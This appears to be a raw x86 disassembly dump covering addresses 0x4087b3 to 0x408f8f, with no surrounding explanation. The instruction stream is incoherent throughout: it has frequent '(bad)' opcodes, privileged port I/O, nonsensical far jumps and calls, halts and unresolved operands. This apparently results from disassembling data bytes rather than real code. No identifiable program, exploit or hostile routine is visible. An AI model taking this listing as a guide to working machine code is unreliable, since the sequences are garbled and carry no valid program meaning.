  4087b3:	sbb    BYTE PTR [eax+0x5ecb2069],bh
  4087b9:	mov    ecx,0xfac8904b
  4087be:	fwait
  4087bf:	inc    ecx
  4087c0:	push   ebx
  4087c1:	in     al,0xb8
  4087c3:	sbb    al,0x8a
  4087c5:	and    DWORD PTR [eax+0x6163cbab],ebp
  4087cb:	fdiv   DWORD PTR [edi-0x42]
  4087ce:	popf   
  4087cf:	fiadd  WORD PTR [ebp-0x2a]
  4087d2:	jnp    0x40882d
  4087d4:	or     al,cl
  4087d6:	jne    0x40881e
  4087d8:	xchg   ebx,eax
  4087d9:	inc    esp
  4087da:	push   ebx
  4087db:	cmp    BYTE PTR [esi-0x60],0x87
  4087df:	(bad)  
  4087e0:	mov    ds:0x10595a43,al
  4087e5:	fbld   TBYTE PTR [edi*4-0x2564a6a3]
  4087ec:	sbb    BYTE PTR [ebx-0x39],dh
  4087ef:	cmp    esp,DWORD PTR [edi+0x1e]
  4087f2:	and    al,0x7b
  4087f4:	in     al,0xbe
  4087f6:	mov    edx,0xfe9c4531
  4087fb:	adc    BYTE PTR [eax-0x3e],bl
  4087fe:	adc    esi,0x45
  408801:	test   BYTE PTR [esi],dh
  408803:	jecxz  0x4087fe
  408805:	xor    al,0x4d
  408807:	push   eax
  408808:	loope  0x408878
  40880a:	ins    DWORD PTR es:[edi],dx
  40880b:	je     0x40887a
  40880d:	test   ah,cl
  40880f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408810:	adc    al,0x52
  408812:	cmp    al,0x7b
  408814:	xchg   edx,edx
  408816:	fmul   QWORD PTR [edx+0x5a9b634c]
  40881c:	mov    dl,0xeb
  40881e:	sbb    al,0x78
  408820:	push   edx
  408821:	jp     0x408850
  408823:	aas    
  408824:	mov    WORD PTR [esp+edx*1],ds
  408827:	sbb    bh,BYTE PTR [edi-0x6b]
  40882a:	inc    edi
  40882b:	or     DWORD PTR [ecx-0x1],edx
  40882e:	std    
  40882f:	xor    DWORD PTR [ecx+0x7c],ebp
  408832:	jle    0x408877
  408834:	xchg   edi,eax
  408835:	mov    eax,ds:0x94c21c12
  40883a:	cmp    DWORD PTR [esi],ebx
  40883c:	repnz jmp 0x2d80:0xc869041f
  408844:	push   edx
  408845:	popa   
  408846:	inc    esp
  408847:	sub    ah,al
  408849:	into   
  40884a:	jnp    0x4088bf
  40884c:	pop    esp
  40884d:	call   0x54de:0x9107a6c8
  408854:	outs   dx,BYTE PTR ds:[esi]
  408855:	sbb    ecx,DWORD PTR [ebp+0x40]
  408858:	sbb    eax,0xffffffce
  40885b:	dec    edx
  40885c:	add    eax,0x71665da4
  408861:	ret    
  408862:	push   edx
  408863:	les    esp,FWORD PTR [eax-0x348e6c38]
  408869:	inc    edi
  40886a:	pop    ebx
  40886b:	or     bh,BYTE PTR [edi+0x1edf9dc3]
  408871:	(bad)  
  408872:	and    al,0x86
  408874:	jb     0x408842
  408876:	shl    DWORD PTR [ecx],1
  408878:	ror    DWORD PTR ds:0x7957a8cb,1
  40887e:	leave  
  40887f:	sub    eax,0x7e37db98
  408884:	mov    ch,cl
  408886:	gs (bad) 
  408889:	push   0xd55da5a2
  40888e:	dec    sp
  408890:	xchg   ebp,eax
  408891:	mov    bh,0x1f
  408893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408894:	lods   al,BYTE PTR ds:[esi]
  408895:	and    ebx,DWORD PTR [eax]
  408897:	add    edi,ebp
  408899:	loope  0x408882
  40889b:	mov    dl,0xee
  40889d:	mov    eax,0x52702353
  4088a2:	push   esi
  4088a3:	scas   eax,DWORD PTR es:[edi]
  4088a4:	outs   dx,BYTE PTR ds:[esi]
  4088a5:	add    al,0xbc
  4088a7:	inc    edx
  4088a8:	adc    dh,BYTE PTR [ecx+0x70e379f]
  4088ae:	push   ebx
  4088af:	xchg   edi,eax
  4088b0:	pop    ebp
  4088b1:	cmp    eax,0x7658d680
  4088b6:	inc    ebx
  4088b7:	mov    ebx,0x3984b3d6
  4088bc:	ret    0xf511
  4088bf:	push   0xe
  4088c1:	or     BYTE PTR [eax-0x496583ad],ch
  4088c7:	pop    esp
  4088c8:	out    0x98,eax
  4088ca:	sbb    BYTE PTR [esi-0x7f5813da],bh
  4088d0:	std    
  4088d1:	xchg   esp,eax
  4088d2:	out    dx,al
  4088d3:	imul   esi,esp,0x22
  4088d6:	shl    DWORD PTR [ebx+0x3b],0x1
  4088da:	(bad)  
  4088db:	ins    BYTE PTR es:[edi],dx
  4088dc:	xor    BYTE PTR [ecx-0x1b],dh
  4088df:	or     eax,0xc0db4614
  4088e4:	rol    DWORD PTR [edi-0x33],cl
  4088e7:	push   esp
  4088e8:	mov    al,BYTE PTR [esi-0x3f]
  4088eb:	out    dx,al
  4088ec:	outs   dx,BYTE PTR ds:[esi]
  4088ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088ee:	cmp    dh,BYTE PTR [ebx+0x5]
  4088f1:	mov    cl,0xd4
  4088f3:	(bad)  
  4088f4:	ja     0x408935
  4088f6:	jns    0x408914
  4088f8:	inc    edx
  4088f9:	mov    BYTE PTR [esp+edi*1],dh
  4088fc:	jmp    0x34df:0x5dd6eeae
  408903:	lahf   
  408904:	test   DWORD PTR [ebp+0x7c],edx
  408907:	jecxz  0x40895e
  408909:	pop    eax
  40890a:	enter  0x87cd,0x14
  40890e:	mov    ebp,0xa0a9debd
  408913:	xlat   BYTE PTR ds:[ebx]
  408914:	xchg   esi,eax
  408915:	xor    BYTE PTR [eax-0x1f],ch
  408918:	adc    eax,0x1318406d
  40891d:	pop    eax
  40891e:	clc    
  40891f:	ja     0x408965
  408921:	add    al,0xe6
  408923:	mov    eax,0x323b06d7
  408928:	inc    eax
  408929:	xor    DWORD PTR [edx],edx
  40892b:	jmp    0x8fb6c409
  408930:	je     0x408906
  408932:	sub    eax,DWORD PTR [edi]
  408934:	mov    dl,0x67
  408936:	mov    dl,BYTE PTR [ebp+0x39]
  408939:	sub    bl,BYTE PTR [ebp+0x42]
  40893c:	xor    ebx,edi
  40893e:	mov    ebx,ebx
  408940:	xor    ebp,DWORD PTR [eax]
  408942:	jnp    0x408998
  408944:	sub    eax,0xf445915a
  408949:	pop    ss
  40894a:	vpsrld xmm1,xmm3,0xf5
  40894f:	ins    DWORD PTR es:[edi],dx
  408950:	sar    BYTE PTR [ebp+0x39],0xc
  408954:	xchg   esp,eax
  408955:	or     dl,ch
  408957:	out    dx,eax
  408958:	inc    esp
  408959:	fidivr DWORD PTR [edx+0x4a]
  40895c:	pop    esp
  40895d:	xlat   BYTE PTR ds:[ebx]
  40895e:	or     al,0x6a
  408960:	cmp    DWORD PTR [eax],edx
  408962:	or     eax,0xb751d2e2
  408967:	retf   
  408968:	outs   dx,DWORD PTR ss:[esi]
  40896a:	lea    ebx,[edx]
  40896c:	and    eax,0xe5d257a1
  408971:	aaa    
  408972:	push   ebp
  408973:	cli    
  408974:	pop    edi
  408975:	daa    
  408976:	clc    
  408977:	sub    cl,dl
  408979:	aas    
  40897a:	sbb    eax,0x7eb044d
  40897f:	or     DWORD PTR [edx+0x452fe4d8],esi
  408985:	jecxz  0x4089df
  408987:	cmovb  ebp,DWORD PTR [edi]
  40898a:	sbb    DWORD PTR [edi],ecx
  40898c:	rol    DWORD PTR [eax+edx*2+0x46b7d3cf],0xe1
  408994:	inc    edi
  408995:	mov    cs,WORD PTR [eax]
  408997:	jns    0x40893b
  408999:	dec    esi
  40899a:	out    0x1a,al
  40899c:	dec    edi
  40899d:	in     eax,0x87
  40899f:	inc    BYTE PTR [edi-0x3c]
  4089a2:	mov    ds:0xec652f2,al
  4089a7:	repnz mov esp,0x68f2305c
  4089ad:	sbb    esi,DWORD PTR [eax+0x78ac0174]
  4089b3:	test   eax,0x61a208e9
  4089b8:	pop    edx
  4089b9:	jmp    0x4089b2
  4089bb:	sbb    eax,0xfce5f085
  4089c0:	push   esp
  4089c1:	in     al,dx
  4089c2:	inc    ecx
  4089c3:	add    dl,BYTE PTR [esi-0x7a83e2e]
  4089c9:	mov    ds:0xdbe1d1b,eax
  4089ce:	test   eax,0xd7fdecbb
  4089d3:	fnstcw WORD PTR [edi+0x6c]
  4089d6:	pop    edi
  4089d7:	mov    cl,0xb7
  4089d9:	fiadd  DWORD PTR [edx-0x11]
  4089dc:	je     0x408a17
  4089de:	sbb    al,0xc
  4089e0:	push   ebp
  4089e1:	cmp    esp,DWORD PTR [edx+0x29eed16]
  4089e7:	out    0x69,al
  4089e9:	(bad)  
  4089ea:	in     al,dx
  4089eb:	iret   
  4089ec:	popf   
  4089ed:	cdq    
  4089ee:	mov    ch,0xea
  4089f0:	dec    edi
  4089f1:	retf   
  4089f2:	fnstsw WORD PTR [ecx]
  4089f4:	mov    ecx,0xc83a80c5
  4089f9:	das    
  4089fa:	aad    0x32
  4089fc:	jmp    0x408981
  4089fe:	cdq    
  4089ff:	leave  
  408a00:	mov    cl,BYTE PTR ds:0xd0b8c50e
  408a06:	jo     0x408a1b
  408a08:	fisub  WORD PTR [esi+eiz*8]
  408a0b:	out    0x54,al
  408a0d:	ret    0xc7d2
  408a10:	sub    eax,0x7c82efdf
  408a15:	cld    
  408a16:	mov    ebp,0xe59ec939
  408a1b:	xchg   ebp,eax
  408a1c:	cmp    ch,ch
  408a1e:	xchg   esp,eax
  408a1f:	xor    BYTE PTR [ebx-0x607e8364],bl
  408a25:	jns    0x408a68
  408a27:	xacquire xchg BYTE PTR [edx],dl
  408a2a:	adc    eax,0x44103c9b
  408a2f:	out    0xf5,eax
  408a31:	xor    al,0xc8
  408a33:	fs jg  0x408a61
  408a36:	in     eax,0x20
  408a38:	(bad)  
  408a39:	imul   edi,DWORD PTR [ebp-0x55],0x53
  408a3d:	adc    edx,esp
  408a3f:	outs   dx,BYTE PTR ds:[esi]
  408a40:	dec    esp
  408a41:	add    eax,0x7e759b04
  408a46:	xor    ah,cl
  408a48:	push   cs
  408a49:	aas    
  408a4a:	lea    ecx,[ebx]
  408a4c:	mov    esi,0xb919288a
  408a51:	cmp    ebx,edi
  408a53:	and    ch,BYTE PTR [edx+0x3b6c7cf8]
  408a59:	call   0x1f9d4be6
  408a5e:	pushf  
  408a5f:	jno    0x408a3d
  408a61:	call   0xc61c93f2
  408a66:	cli    
  408a67:	loop   0x408add
  408a69:	gs mov cl,0x89
  408a6c:	sbb    BYTE PTR [esi-0x30b75529],bl
  408a72:	inc    esp
  408a73:	sti    
  408a74:	ret    0x369a
  408a77:	popa   
  408a78:	inc    edx
  408a79:	pop    ebx
  408a7a:	lock fmul QWORD PTR [esi-0x4bb18a97]
  408a81:	or     dl,BYTE PTR [esi-0x3623a74a]
  408a87:	mov    edx,0x6cdbbc94
  408a8c:	jmp    0x6af9:0x66857b66
  408a93:	cmp    DWORD PTR [edx+0x1f],ecx
  408a96:	jns    0x408a49
  408a98:	les    edx,FWORD PTR [ecx]
  408a9a:	mov    eax,0x25cc13ce
  408a9f:	ds xchg ecx,eax
  408aa1:	es push eax
  408aa3:	retf   0x5dbc
  408aa6:	mov    al,0x7d
  408aa8:	aas    
  408aa9:	aaa    
  408aaa:	fsubrp st(7),st
  408aac:	jmp    0x314d:0x67bfa338
  408ab3:	call   0x3607bc45
  408ab8:	fs sahf 
  408aba:	add    eax,0xcd870d31
  408abf:	fisttp DWORD PTR cs:[ebx+0x3c]
  408ac3:	xchg   esi,eax
  408ac4:	jle    0x408a71
  408ac6:	in     eax,dx
  408ac7:	into   
  408ac8:	cdq    
  408ac9:	push   edi
  408aca:	test   al,0x18
  408acc:	aas    
  408acd:	clc    
  408ace:	ror    DWORD PTR [edx-0x7b],0xb1
  408ad2:	dec    ecx
  408ad3:	rol    DWORD PTR [ecx+0x375828],cl
  408ad9:	fsubr  st(0),st
  408adb:	xor    BYTE PTR [ecx+0x3e],0x1d
  408adf:	(bad)  [edx-0x3ec1e961]
  408ae5:	sahf   
  408ae6:	jge    0x408a92
  408ae8:	mov    cl,dh
  408aea:	cmp    DWORD PTR [edx+0x51],0x55
  408aee:	cli    
  408aef:	rcr    BYTE PTR [esi],1
  408af1:	xlat   BYTE PTR ds:[ebx]
  408af3:	push   esi
  408af4:	test   eax,0xadf5d9e1
  408af9:	jge    0x408b59
  408afb:	and    eax,0x5bfa8bcc
  408b00:	hlt    
  408b01:	mov    ebp,0x339002ec
  408b06:	cvtps2pd xmm2,QWORD PTR [eax+0x56]
  408b0a:	dec    esi
  408b0b:	dec    ebp
  408b0c:	adc    ch,ch
  408b0e:	push   edx
  408b0f:	icebp  
  408b10:	retf   0xb5ff
  408b13:	sub    edi,ebx
  408b15:	stos   BYTE PTR es:[edi],al
  408b16:	cmp    ah,BYTE PTR [ebp+0x6eb02c1a]
  408b1c:	jbe    0x408ae6
  408b1e:	popf   
  408b1f:	lods   eax,DWORD PTR ds:[esi]
  408b20:	iret   
  408b21:	(bad)
  408b24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b25:	popa   
  408b26:	or     DWORD PTR [edx+0x357e00f3],eax
  408b2c:	mov    ecx,0xabaa1172
  408b31:	jo     0x408b2b
  408b33:	pop    ecx
  408b34:	xor    DWORD PTR [ecx],ebp
  408b36:	xchg   edi,eax
  408b37:	xchg   ebp,eax
  408b38:	js     0x408b9c
  408b3a:	in     al,0x64
  408b3c:	inc    ebx
  408b3d:	dec    eax
  408b3e:	mov    al,ds:0x1abe5db7
  408b43:	fs std 
  408b45:	out    0xdd,al
  408b47:	xchg   BYTE PTR ds:0xd0125170,al
  408b4d:	jo     0x408b51
  408b4f:	xor    DWORD PTR [ebx],0x3b2fb06e
  408b55:	div    BYTE PTR [edx+0x4c9e8c10]
  408b5b:	sti    
  408b5c:	inc    ecx
  408b5d:	repnz sub al,0xd2
  408b60:	dec    ebp
  408b61:	adc    eax,0x697d4c4
  408b66:	lock popf 
  408b68:	inc    esp
  408b69:	sar    DWORD PTR [eax+eax*8],0xc3
  408b6d:	or     esi,DWORD PTR [edi+0x4aeeba62]
  408b73:	sbb    edx,edx
  408b75:	arpl   WORD PTR [esi-0x57bc62d7],bx
  408b7b:	mov    cl,0x49
  408b7d:	mov    WORD PTR [eax+0x25788099],ds
  408b83:	enter  0x36b7,0x7c
  408b87:	shl    BYTE PTR [edi-0x44],1
  408b8a:	sub    DWORD PTR [esi+0x189770b2],edx
  408b90:	pusha  
  408b91:	ss xor dl,al
  408b94:	ret    0x3f7e
  408b97:	xor    al,0x14
  408b99:	jl     0x408b6c
  408b9b:	jb     0x408b92
  408b9d:	dec    edx
  408b9e:	std    
  408b9f:	cli    
  408ba0:	sbb    DWORD PTR [edi-0x2494cc02],0xbd97246e
  408baa:	mov    WORD PTR [ebp+0x42f00b99],gs
  408bb0:	add    dh,cl
  408bb2:	cs jmp 0x408b4d
  408bb5:	js     0x408c11
  408bb7:	pop    esp
  408bb8:	jne    0x408be2
  408bba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bbb:	mov    cl,0xee
  408bbd:	in     al,dx
  408bbe:	pop    edx
  408bbf:	and    al,0x73
  408bc1:	and    cl,dl
  408bc3:	push   0x8e060623
  408bc8:	add    ah,cl
  408bca:	ins    DWORD PTR es:[edi],dx
  408bcb:	xlat   BYTE PTR ds:[ebx]
  408bcc:	mov    ds:0x3a957c4f,eax
  408bd1:	(bad)  
  408bd2:	lods   al,BYTE PTR ds:[esi]
  408bd3:	sbb    DWORD PTR [ebp-0x72],0xfb366297
  408bda:	addr16 iret 
  408bdc:	leave  
  408bdd:	xchg   edi,esi
  408bdf:	inc    esi
  408be0:	loope  0x408c22
  408be2:	push   ecx
  408be3:	test   al,0xe9
  408be5:	push   DWORD PTR [esi+eiz*4]
  408be8:	mov    esp,eax
  408bea:	stc    
  408beb:	pop    esp
  408bec:	sub    edx,DWORD PTR [eax-0x14]
  408bef:	or     al,0xe9
  408bf1:	addr16 js 0x408b88
  408bf4:	jl     0x408c0a
  408bf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bf7:	sbb    BYTE PTR cs:[edx],bl
  408bfa:	dec    ecx
  408bfb:	dec    esp
  408bfc:	xor    DWORD PTR [ecx],ebx
  408bfe:	bound  ecx,QWORD PTR [ecx]
  408c00:	mov    ebp,0x33db9bc6
  408c05:	cmp    al,0x8e
  408c07:	xlat   BYTE PTR ds:[ebx]
  408c08:	push   ebp
  408c09:	sub    BYTE PTR [esi+0x1],bl
  408c0c:	jmp    0xa963b3b0
  408c11:	das    
  408c12:	out    0xdb,al
  408c14:	test   eax,0xea4a2452
  408c19:	pop    ebx
  408c1a:	jg     0x408bb8
  408c1c:	push   es
  408c1d:	sahf   
  408c1e:	inc    eax
  408c1f:	std    
  408c20:	sti    
  408c21:	repnz inc esp
  408c23:	ret    0x7a83
  408c26:	sti    
  408c27:	push   0xffffffeb
  408c29:	out    0x98,al
  408c2b:	jge    0x408c1f
  408c2d:	sbb    al,0xe
  408c2f:	jne    0x408c86
  408c31:	mov    bh,0x34
  408c33:	aaa    
  408c34:	bound  ecx,QWORD PTR [esi-0xc04d8f9]
  408c3a:	xlat   BYTE PTR ds:[ebx]
  408c3b:	std    
  408c3c:	test   ah,dl
  408c3e:	loop   0x408c79
  408c40:	cmp    DWORD PTR [edx],0x4a
  408c43:	es dec edx
  408c45:	out    dx,eax
  408c46:	push   ds
  408c47:	adc    eax,0x21e81c8b
  408c4c:	xchg   ebp,eax
  408c4d:	push   ss
  408c4e:	push   es
  408c4f:	pop    es
  408c50:	jg     0x408c63
  408c52:	mov    ah,0xa4
  408c54:	pop    esi
  408c55:	add    bl,cl
  408c57:	ret    0xd1cf
  408c5a:	sahf   
  408c5b:	dec    esp
  408c5c:	lock mov WORD PTR [ebx],?
  408c5f:	(bad)  
  408c60:	jle    0x408c0b
  408c62:	retf   0x2c9c
  408c65:	fnstsw WORD PTR [ebp-0x5262d55a]
  408c6b:	sbb    eax,0x9a73c87
  408c70:	sti    
  408c71:	jmp    0x9593:0x91a457e8
  408c78:	xchg   ebp,eax
  408c79:	pop    edi
  408c7a:	(bad)  
  408c7b:	ds cli 
  408c7d:	sbb    DWORD PTR [edx+ebp*2-0x3b],esi
  408c81:	and    ecx,esp
  408c83:	rcr    BYTE PTR [edi+0x1e575e3e],0x93
  408c8a:	das    
  408c8b:	or     BYTE PTR [edx-0xda1dd91],cl
  408c91:	push   0x4210d2f7
  408c96:	cmp    DWORD PTR [ecx],esp
  408c98:	cmp    al,0x2a
  408c9a:	mov    ecx,0x78b33bad
  408c9f:	adc    al,0xb7
  408ca1:	jbe    0x408c30
  408ca3:	xchg   esi,eax
  408ca4:	add    al,0x5f
  408ca6:	mov    ds:0x4bf9773a,eax
  408cab:	aam    0x7e
  408cad:	dec    esp
  408cae:	cld    
  408caf:	hlt    
  408cb0:	jae    0x408c75
  408cb2:	pop    ds
  408cb3:	popa   
  408cb4:	dec    BYTE PTR [edx]
  408cb6:	cmp    eax,0x4cf09c40
  408cbb:	push   esi
  408cbc:	pushf  
  408cbd:	jge    0x408c89
  408cbf:	and    ebp,0xff0d36e4
  408cc5:	xchg   ecx,eax
  408cc6:	clc    
  408cc7:	sbb    al,0x80
  408cc9:	xchg   BYTE PTR [edi+0x2f],dl
  408ccc:	inc    edx
  408ccd:	mov    edx,0x23e6fabe
  408cd2:	out    dx,eax
  408cd3:	mov    bl,0x44
  408cd5:	xchg   ebp,eax
  408cd6:	in     al,0x2
  408cd8:	push   cs
  408cd9:	fcmovb st,st(4)
  408cdb:	sbb    cl,BYTE PTR ds:0x9413a08
  408ce1:	adc    DWORD PTR [ebx],esp
  408ce3:	mov    ebx,0x1fd9c598
  408ce8:	xlat   BYTE PTR ds:[ebx]
  408ce9:	shl    DWORD PTR [edi+0x4d],cl
  408cec:	sahf   
  408ced:	rcr    edi,cl
  408cef:	mov    ecx,0x8ab214ba
  408cf4:	lgs    ebx,FWORD PTR [eax-0x7c99d542]
  408cfb:	add    al,0xc
  408cfd:	jg     0x408d49
  408cff:	mov    bl,0xff
  408d01:	cs popa 
  408d03:	rol    DWORD PTR [ecx-0x5b6196a6],cl
  408d09:	fimul  WORD PTR [ebx+0x3a3237eb]
  408d0f:	lds    esi,FWORD PTR [ecx+edx*1]
  408d12:	sub    al,0xfb
  408d14:	stc    
  408d15:	call   0xbe6d6c93
  408d1a:	push   0x0
  408d1c:	std    
  408d1d:	ins    DWORD PTR es:[edi],dx
  408d1e:	dec    edx
  408d1f:	icebp  
  408d20:	mov    ebx,DWORD PTR [edx+edi*2-0x56]
  408d24:	in     eax,0xcf
  408d26:	sbb    DWORD PTR [ebx+0x56915b23],ebp
  408d2c:	xor    al,0x77
  408d2e:	repz adc eax,ebx
  408d31:	loopne 0x408d51
  408d33:	sbb    edx,edx
  408d35:	pop    ebp
  408d36:	fiadd  DWORD PTR [edx+eiz*8-0x5e]
  408d3a:	addr16 inc ebx
  408d3c:	and    DWORD PTR [edx-0x61],esi
  408d3f:	mov    ss,WORD PTR [eax]
  408d41:	adc    ch,BYTE PTR [esi-0x2c]
  408d44:	lock or DWORD PTR [edi-0x714f9451],edi
  408d4b:	popa   
  408d4c:	jnp    0x408d54
  408d4e:	icebp  
  408d4f:	xchg   BYTE PTR [eax-0x564cdc56],cl
  408d55:	cwde   
  408d56:	loope  0x408cf2
  408d58:	ror    DWORD PTR [ebx-0x55],1
  408d5b:	mov    eax,ds:0x658a9dce
  408d60:	cmp    edi,esi
  408d62:	call   0xc956:0x3769e0d1
  408d69:	jmp    0x1fdd0c78
  408d6e:	sbb    ebx,DWORD PTR [ecx+0xf4d3e10]
  408d74:	imul   esp,ebp,0x5f6e681b
  408d7a:	jl     0x408d1d
  408d7c:	fnstenv [esi+0x6a]
  408d7f:	add    al,0x9
  408d81:	pop    ds
  408d82:	mov    bh,0x71
  408d84:	mov    ds:0x6a437ec1,al
  408d89:	sbb    edi,DWORD PTR [ecx+0x5d]
  408d8c:	inc    ebp
  408d8d:	in     eax,dx
  408d8e:	div    BYTE PTR [esi]
  408d90:	inc    esi
  408d91:	pop    ds
  408d92:	pop    ebx
  408d93:	sub    al,0xd5
  408d95:	pop    edx
  408d96:	repnz xchg ebp,eax
  408d98:	aaa    
  408d99:	ja     0x408dd6
  408d9b:	hlt    
  408d9c:	mov    edi,0xbbd4746b
  408da1:	bound  esi,QWORD PTR [ebx-0x51]
  408da4:	stc    
  408da5:	(bad)
  408da8:	adc    ch,cl
  408daa:	test   eax,0xab2c1ba6
  408daf:	dec    eax
  408db0:	sub    bl,cl
  408db2:	adc    eax,0x5e0a1c4c
  408db7:	push   ebx
  408db8:	mov    esi,0x54f94aa5
  408dbd:	addr16 pop es
  408dbf:	inc    edx
  408dc0:	nop
  408dc1:	fst    DWORD PTR [edi+edx*8+0x1a]
  408dc5:	inc    ecx
  408dc6:	retf   0x242
  408dc9:	idiv   cl
  408dcb:	das    
  408dcc:	fcomp  DWORD PTR [ecx+ecx*4-0x457c440b]
  408dd3:	repnz (bad) 
  408dd5:	jl     0x408e19
  408dd7:	jbe    0x408d9a
  408dd9:	sbb    eax,0x89856c34
  408dde:	clc    
  408ddf:	mov    ch,0xfe
  408de1:	mov    dl,0x26
  408de3:	dec    ebp
  408de4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408de5:	xchg   edi,eax
  408de6:	data16 out dx,al
  408de8:	inc    ebp
  408de9:	aad    0x1a
  408deb:	loope  0x408dff
  408ded:	lods   al,BYTE PTR ds:[esi]
  408dee:	pop    ebx
  408def:	cs sub al,0x4b
  408df2:	cmp    eax,0xe2838205
  408df7:	adc    al,0x15
  408dfa:	pop    ss
  408dfb:	leave  
  408dfc:	push   ds
  408dfd:	lea    esi,[eax]
  408dff:	sbb    DWORD PTR [esi-0x38],ebx
  408e02:	mov    esp,edi
  408e04:	sbb    bh,BYTE PTR [ecx-0x6abd7167]
  408e0a:	jl     0x408db9
  408e0c:	call   0xb5cd:0xf18f91d2
  408e13:	mov    ecx,0xb73c6083
  408e18:	mov    ah,0x90
  408e1a:	jg     0x408e05
  408e1c:	aam    0xa1
  408e1e:	push   ss
  408e1f:	js     0x408e51
  408e21:	cmp    eax,0xf6301986
  408e26:	or     eax,edx
  408e28:	outs   dx,DWORD PTR ds:[esi]
  408e29:	scas   al,BYTE PTR es:[edi]
  408e2a:	or     eax,0x6cb27710
  408e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e30:	mov    BYTE PTR [edi+edi*4-0x42],bh
  408e34:	repnz jmp 0x8db9:0x3a40c7e2
  408e3c:	scas   eax,DWORD PTR es:[edi]
  408e3d:	push   esp
  408e3e:	mov    ch,0xe7
  408e40:	or     al,0x5f
  408e42:	mov    esp,0xc90d1fd5
  408e47:	jns    0x408ec0
  408e49:	mov    WORD PTR [ebx-0x335951b3],?
  408e4f:	mov    esp,0x12149569
  408e54:	sub    DWORD PTR [edi],0xfea2cc29
  408e5a:	pop    esi
  408e5b:	mov    bh,0xc1
  408e5d:	inc    esi
  408e5e:	mov    al,0x78
  408e60:	mov    ebx,0x91d4391e
  408e65:	xchg   BYTE PTR [eax],ch
  408e67:	jnp    0x408e10
  408e69:	cmp    eax,0xd26e6863
  408e6e:	out    dx,al
  408e6f:	das    
  408e70:	daa    
  408e71:	cmp    al,0x31
  408e73:	loope  0x408dfb
  408e75:	add    eax,0x11e64e83
  408e7a:	aam    0x24
  408e7c:	inc    esi
  408e7d:	sahf   
  408e7e:	xor    eax,0xce2cfaa9
  408e83:	pushf  
  408e84:	push   ebp
  408e85:	stc    
  408e86:	adc    BYTE PTR [edi],bl
  408e88:	fnstsw WORD PTR [ebx-0x1a11e828]
  408e8e:	cmp    al,dl
  408e90:	dec    ecx
  408e91:	push   edx
  408e92:	xor    ah,dl
  408e94:	mov    WORD PTR [eax+ebx*2],?
  408e97:	xlat   BYTE PTR ds:[ebx]
  408e98:	ret    0x30c4
  408e9b:	mov    cs,eax
  408e9d:	jae    0x408e34
  408e9f:	or     DWORD PTR [edi+0x2038b7d9],ebp
  408ea5:	fst    DWORD PTR [ecx]
  408ea7:	mov    ?,WORD PTR [ecx+0x3b]
  408eaa:	xchg   esp,eax
  408eab:	sbb    eax,0xdcb045e0
  408eb0:	idiv   DWORD PTR [ebx-0x62]
  408eb3:	inc    eax
  408eb4:	rol    DWORD PTR [ecx+0xb],1
  408eb7:	pop    esi
  408eb8:	ficom  DWORD PTR [ebp-0x2ab8e655]
  408ebe:	xlat   BYTE PTR ds:[ebx]
  408ebf:	jge    0x408e43
  408ec1:	fwait
  408ec2:	pop    ebp
  408ec3:	inc    ebx
  408ec4:	ror    dl,0xa0
  408ec7:	mov    ds:0x31975885,al
  408ecc:	call   0x48fd:0x37cd49
  408ed3:	inc    edx
  408ed4:	and    eax,0xfda578e9
  408ed9:	jo     0x408f48
  408edb:	jne    0x408f36
  408edd:	ror    BYTE PTR [eax],cl
  408edf:	jg     0x408ece
  408ee1:	mov    esi,esp
  408ee3:	js     0x408f5d
  408ee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ee6:	lock outs dx,DWORD PTR ds:[esi]
  408ee8:	and    eax,0x2c10c29d
  408eed:	pop    es
  408eee:	sub    ebp,DWORD PTR [eax]
  408ef0:	and    al,0xd8
  408ef2:	sbb    BYTE PTR [eax+0x1e],al
  408ef5:	fild   WORD PTR [edi+0x14]
  408ef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ef9:	loopne 0x408eb9
  408efb:	push   0xb8ed1c5
  408f00:	pop    edi
  408f01:	pusha  
  408f02:	sub    al,0x20
  408f04:	xchg   ebp,eax
  408f05:	mov    ebx,0xf67bef63
  408f0a:	inc    esi
  408f0b:	lods   eax,DWORD PTR ds:[esi]
  408f0c:	pop    edx
  408f0d:	or     al,0x27
  408f0f:	pop    esi
  408f10:	xchg   ebx,eax
  408f11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f12:	dec    ebx
  408f13:	out    dx,al
  408f14:	push   esi
  408f15:	sub    DWORD PTR [ebp-0x61],ecx
  408f18:	shr    DWORD PTR es:[edi],1
  408f1b:	rcr    al,0x6e
  408f1e:	loopne 0x408f53
  408f20:	cmp    eax,0xe5599dd8
  408f25:	xchg   edi,eax
  408f26:	bound  esi,QWORD PTR [edx]
  408f28:	sbb    DWORD PTR [ebp-0x159feb12],edx
  408f2e:	retf   
  408f2f:	shl    DWORD PTR [ecx],0xb7
  408f32:	mov    esp,0x2687d90e
  408f37:	xor    al,0x2f
  408f39:	cdq    
  408f3a:	dec    edi
  408f3b:	in     eax,dx
  408f3c:	popf   
  408f3d:	push   esp
  408f3e:	jmp    0x3ab44fbb
  408f43:	repz iret 
  408f45:	jbe    0x408ef2
  408f47:	xchg   ebp,eax
  408f48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f49:	pop    esp
  408f4a:	pusha  
  408f4b:	mov    al,0xc1
  408f4d:	aaa    
  408f4e:	cmp    eax,0xc17e128a
  408f53:	xor    eax,0x9edc809c
  408f58:	int    0x61
  408f5a:	in     eax,0x6d
  408f5c:	mov    ebx,0xcdbf6ecd
  408f61:	hlt    
  408f62:	fdivr  DWORD PTR [esi+0x1ffd07d]
  408f68:	and    eax,0x31a00ce5
  408f6d:	shl    DWORD PTR [edi],1
  408f6f:	mov    edx,0xac480d55
  408f74:	xor    eax,esp
  408f76:	call   0xc7ba122d
  408f7b:	or     DWORD PTR [esi-0x2f],eax
  408f7e:	xlat   BYTE PTR ds:[ebx]
  408f7f:	cmc    
  408f80:	add    DWORD PTR [esi+0x6ed61eaf],0x17
  408f87:	cld    
  408f88:	adc    al,0x41
  408f8a:	mov    eax,ds:0xf748c8f8
  408f8f:	add    al,0x6a
